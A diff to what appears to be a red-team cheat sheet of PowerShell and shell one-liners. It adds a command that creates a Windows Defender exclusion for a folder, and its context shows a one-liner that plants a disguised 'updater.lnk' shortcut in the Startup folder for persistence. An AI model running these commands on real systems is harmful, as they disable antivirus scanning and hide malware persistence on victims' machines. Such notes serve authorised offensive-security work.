@@ -13,6 +13,7 @@ author_profile: true
   - [Powershell-friendly base64 from Linux](#powershell-friendly-base64-from-linux)
   - [Base64 encode file](#base64-encode-file)
   - [Create a shortcut lnk one-liner](#create-a-shortcut-lnk-one-liner)
+  - [Create a Windows Defender exclusion](#create-a-windows-defender-exclusion)
 - [Shells](#shells)
   - [Bash](#bash)
   - [Perl](#perl)
@@ -62,6 +63,10 @@ echo -n '<text>' | iconv -f UTF8 -t UTF16LE | base64
 ### Create a shortcut lnk one-liner
 ```
 $Shortcut = (New-Object -comObject WScript.Shell).CreateShortcut("C:\users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk"); $Shortcut.TargetPath = "C:\users\<user>\AppData\updater2.exe";$Shortcut.Save()
+```
+### Create a Windows Defender exclusion
+```
+Add-MpPreference -ExclusionPath "C:\users\lolcats\AppData\mysketchdir"
 ```
 ## Shells
 ### Bash
